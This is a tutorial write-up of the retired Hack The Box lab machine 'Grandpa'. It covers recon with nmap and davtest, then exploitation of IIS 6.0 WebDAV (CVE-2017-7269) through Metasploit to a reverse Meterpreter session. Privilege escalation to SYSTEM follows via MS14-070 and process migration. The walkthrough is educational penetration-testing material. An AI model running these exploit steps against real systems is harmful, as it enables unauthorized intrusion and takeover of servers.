---
title: Keep Calm and Hack The Box - Grandpa
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2020-04-29T09:02:33.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-grandpa
coverImage: https://www.freecodecamp.org/news/content/images/2020/04/maureen-white-1.jpeg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: hacking
  slug: hacking
- name: Security
  slug: security
- name: Windows
  slug: windows
seo_title: null
seo_desc: Hack The Box (HTB) is an online platform allowing you to test your penetration
  testing skills. It contains several challenges that are constantly updated. Some
  of them are simulating real world scenarios and some of them lean more towards a
  CTF style...
---

Hack The Box (HTB) is an online platform allowing you to test your penetration testing skills. It contains several challenges that are constantly updated. Some of them are simulating real world scenarios and some of them lean more towards a CTF style of challenge.

**Note**. _Only write-ups of retired HTB machines are allowed._

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-07-at-14.54.17.png)

Grandpa is one of the simpler machines on Hack The Box, however it covers the widely-exploited CVE-2017-7269. This vulnerability is trivial to exploit and granted immediate access to thousands of IIS servers around the globe when it became public knowledge

We will use the following tools to pawn the box on a [Kali Linux box](https://www.kali.org/)

* nmap
* Searchsploit
* davtest
* Metasploit
* Local exploit suggester

Let's get started.

I add grandpa on the /etc/hosts file

```bash
nano /etc/hosts
```

with

```bash
10.10.10.14     grandpa.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-13-at-21.58.02.png)

## Step 1 - Reconnaissance

The first step before exploiting a machine is to do a little bit of scanning and reconnaissance.

This is one of the most important parts as it will determine what you can try to exploit afterwards. It is always better to spend more time on that phase to get as much information as you could.

## Ports scanning

I will use Nmap (Network Mapper). Nmap is a free and open source utility for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. 

There are many commands you can use with this tool to scan the network. If you want to learn more about it, you can have a look at the documentation [here](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-13-at-22.00.02.png)

I use the following command to perform an intensive scan:

```bash
nmap -A -v grandpa.htb
```

**-A:** Enable OS detection, version detection, script scanning, and traceroute

**-v:** Increase verbosity level

**grandpa.htb:** hostname for the Grandpa box

If you find the results a little bit too overwhelming, you can do another command to get only the open ports.

```bash
nmap grandpa.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-13-at-21.59.22.png)

We can see that there is only 1 open port:

**Port** 80. most often used by Hypertext Transfer Protocol (HTTP)

We know that the server is an IIS 6.0 from the http-server-header. **Internet Information Services** (**IIS**, formerly **Internet Information Server**) is an extensible web server software created by Microsoft for use with the Windows NT family. More info [here](https://en.wikipedia.org/wiki/Internet_Information_Services)

> IIS 6.0 (code name "Duct Tape"), included with Windows Server 2003 and Windows XP Professional x64 Edition, added support for IPv6 and included a new worker process model that increased security as well as reliability HTTP.sys was introduced in IIS 6.0 as an HTTP-specific protocol listener for HTTP requests

We can also see from the **http-title** that the website is "under construction" and that there is a **http-webdav-scan** with all the allowed methods

I use nmap script to try to get more information. The script sends an OPTIONS request which lists the dav type, server type, date and allowed methods. It then sends a PROPFIND request and tries to fetch exposed directories and internal IP addresses by doing pattern matching in the response body

```bash
nmap --script http-webdav-scan -p80 grandpa.htb
```

Here is more [info](https://nmap.org/nsedoc/scripts/http-webdav-scan.html) on this script from the nmap website

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-13-at-22.00.37.png)

WebDAV or **Web Distributed Authoring and Versioning** (**WebDAV**) is an extension of the Hypertext Transfer Protocol that allows clients to perform remote Web content authoring operations. More info [here](https://en.wikipedia.org/wiki/WebDAV)

We can see on the server support section that Microsoft's IIS has a WebDAV module.

I use [**davtest**](https://tools.kali.org/web-applications/davtest) to check if I can upload files

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-15.54.24.png)

I use the following command

```bash
davtest -url http://10.10.10.14
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-24-at-14.18.29.png)

It doesn't look like. I use **Searchsploit** to check if there is any known vulnerability on IIS 6.0. Searchsploit is a command line search tool for **[Exploit Database](https://www.exploit-db.com/)**

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-13-at-22.01.08.png)

I use the following command

```bash
searchsploit iis 6.0
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-13-at-22.02.14.png)

I can have more details on the exploit with

```bash
searchsploit -x 41738.py
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-13-at-22.01.38.png)

The attack is based on a [Return-oriented programming](https://en.wikipedia.org/wiki/Return-oriented_programming) chain. **Return-oriented programming** (**ROP**) is a security exploit technique that allows an attacker to execute code in the presence of security defense such as executable space protection and code signing

You can also check the **Exploit Database** to find the exploit

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-24-at-14.28.52.png)
_[https://www.exploit-db.com/search?q=iis+6.0](https://www.exploit-db.com/search?q=iis+6.0)_

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-07-at-16.19.42.png)
_[https://www.exploit-db.com/exploits/41738](https://www.exploit-db.com/exploits/41738)_

the **National Vulnerability Database**

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-22.56.07.png)
_[https://nvd.nist.gov/vuln/detail/CVE-2017-7269](https://nvd.nist.gov/vuln/detail/CVE-2017-7269)_

the **Common Vulnerabilities and Exposure** database

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-22.57.52.png)

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-07-at-16.20.27.png)
_[https://www.cvedetails.com/cve/CVE-2017-7269/](https://www.cvedetails.com/cve/CVE-2017-7269/)_

There is one Metasploit module available

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-07-at-16.20.54.png)
_[https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl)_

## Step 2 - Visiting the website

We don't see much when visiting the website. From the developer console - we can see it's powered by the [ASP.NET](https://dotnet.microsoft.com/apps/aspnet) framework

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-15.50.25.png)

We will use **Metasploit**, which is a penetration testing framework that makes hacking simple. It's an essential tool for many attackers and defenders

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.14.13.png)
_[https://www.metasploit.com/](https://www.metasploit.com/)_

I launch **Metasploit Framework** on Kali and look for command I should use to launch the exploit

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-24-at-14.33.34.png)

If I use this command

```bash
searchsploit iis 6.0
```

I get the same table that I had from the Terminal earlier

If I type

```bash
search iis 6.0
```

I get 174 results

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-24-at-14.38.22.png)

The exploit I'm interested in is number 147 on this list

If you want to have some information on the exploit, you can use the following command

```bash
info exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

And you will get more details on the exploit

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-23.11.30.png)

I use the following command to use the exploit

```bash
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

I need to set up the options before launching the exploit. I check the options with

```bash
show options
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-24-at-14.43.36.png)

I set the **RHOSTS** with the following command

```bash
set RHOSTS 10.10.10.14
```

When I check again the options, I get this

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-24-at-14.47.50.png)

I check if the target is vulnerable with

```bash
check
```

Then I run the exploit with the command

```bash
exploit
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-24-at-15.40.40.png)

And I get a **Meterpreter** session

From the [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) website, we get this definition for Meterpreter

> Meterpreter is an advanced, dynamically extensible payload that uses _in-memory_ DLL injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.

You can read more about Meterpreter [here](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)

Let's start by gathering some information

**getuid** returns the real user ID of the calling process. The session I got doesn't seem to have enough privileges to run this command. The access is denied

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-24-at-15.41.37.png)

When this happens, I list the running processes with 

```bash
ps
```

and pick one running **NT AUTHORITY\NETWORK SERVICE**

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-15.59.49.png)

I migrate to the process 3644 with

```bash
migrate 3644
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-15.58.21.png)

Now when I check getuid, I got 

```bash
Server username: NT AUTHORITY\NETWORK SERVICE

```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-15.58.37.png)

This was the session I got at first before migrating to another process

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.20.57.png)

This is the session I got after migrating to another process

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.21.14.png)

I type the following command to get a standard shell on the target system

```bash
shell
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.01.13.png)

I check who I am on the machine with the command

```bash
whoami
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.01.23.png)

I get more information from the machine with 

```bash
systeminfo
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.01.35.png)

I navigate to **C:\**

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.03.43.png)

then **Documents and Settings** with

```bash
cd "Documents and Settings"
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.04.05.png)

I can see two users - **Administrator** and **Harry**. I try to navigate to Harry. The access is denied. Same for the Administrator folder - which is expected as I don't have root access yet

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.04.13.png)

I exit the shell with the command 

```bash
exit
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.06.47.png)

## Step 3 - Using local exploit suggester

I run the [**local exploit suggester**](https://www.rapid7.com/db/modules/post/multi/recon/local_exploit_suggester). The exploits are suggested based on the architecture and platform that the user has a shell opened as well as the available exploits in meterpreter

```bash
run post/multi/recon/local_exploit_suggester
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.07.12.png)

I will use the **MS14-070** exploit. I look for some more information on **Metasploit** with

```bash
info exploit/windows/local/ms14_070_tcpip_ioctl
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-23.36.28.png)

As well as on the **Rapid7** website

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-23.33.04.png)
_[https://www.rapid7.com/db/modules/exploit/windows/local/ms14_070_tcpip_ioctl](https://www.rapid7.com/db/modules/exploit/windows/local/ms14_070_tcpip_ioctl)_

## Step 4 - Using MS14-070 to perform privilege escalation

I put this session in the background with the command

```bash
background
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.11.48.png)

I run the following command to use the exploit I found

```bash
use exploit/windows/local/ms14_070_tcpip_ioctl
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.12.00.png)

I then check for the options of this exploit

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.12.33.png)

I set the session with

```bash
set SESSION 1
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.12.49.png)

I run the exploit with 

```bash
run
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.13.05.png)

The exploit succeeded but I didn't get a shell back. I check the options

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.13.16.png)

and set the LHOST to my IP with

```bash
set LHOST 10.10.14.36
```

You can check yours [here](https://www.hackthebox.eu/home/htb/access)

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.13.44.png)

I then run the exploit with

```bash
exploit
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.13.57.png)

This confirms that the exploit has succeeded but I still don't get a shell. I check the session with

```bash
sessions -l
```

I should have

```bash
NT AUTHORITY\SYSTEM
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.16.36.png)

Which is not the case now so I go back to this session with

```bash
sessions -i 1
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.38.45.png)

I check **getuid** and get **NT AUTHORITY\SYSTEM** back. I get a standard shell on the target system and check who am I on the machine. I get **NT AUTHORITY\NETWORK SERVICE** back, which is not what I want!

I exit this shell and check the processes. I can see that I have admin access on the machine. I just meed to migrate to another process - which I do with

```bash
migrate 408
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.39.58.png)

Back to the standard shell on the target system and when I check who I am on the machine I'm finally an admin!

## **Step 5 -** Looking for the user.txt flag

I navigate to the **Harry** folder from the **Documents and Settings**

I can list all the files/folders with the following command

```bash
dir
```

I then move to the **Desktop**

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.53.25.png)

And I find the user flag! I can check the content of the file with

```bash
type user.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.42.19.png)

## **Step 6 -** Looking for the root.txt flag

Let's find the root flag now! I navigate up to **Users** and check in to the **Administrator**/**Desktop** folder. I find the flag!

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.42.58.png)

I use the following command to see the content of the file

```bash
type root.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.43.08.png)

Congrats! You found both flags!

Please don’t hesitate to comment, ask questions or share with your friends :)

You can see more of my articles [here](https://www.freecodecamp.org/news/author/sonya/)

You can follow me on [Twitter](https://twitter.com/SonyaMoisset) or on [LinkedIn](https://www.linkedin.com/in/sonyamoisset/)

And don't forget to #**GetSecure**, #**BeSecure** & #**StaySecure**!

---

**Other Hack The Box articles**

* [Keep Calm and Hack The Box - Lame](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/)
* [Keep Calm and Hack The Box - Legacy](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)
* [Keep Calm and Hack The Box - Devel](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-devel/)
* [Keep Calm and Hack The Box - Beep](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/)
* [Keep Calm and Hack The Box - Optimum](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-optimum/)
* [Keep Calm and Hack The Box - Arctic](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-arctic/)

![Artist - Maureen White](https://www.freecodecamp.org/news/content/images/2020/04/maureen-white-2.jpeg)

